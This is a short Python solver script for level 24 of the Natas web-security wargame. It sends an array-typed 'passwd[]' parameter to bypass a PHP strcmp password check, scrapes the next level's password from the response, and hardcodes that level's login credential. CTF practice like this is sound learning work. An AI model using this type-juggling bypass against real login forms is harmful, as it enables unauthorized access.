# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
import requests

def natas24():
    username="natas24"
    password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
    content = get_page(24, username, password, "?passwd[]=lol")
    password = re.search(r"(?<=Password: )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))
    
if __name__ == "__main__":
    natas24()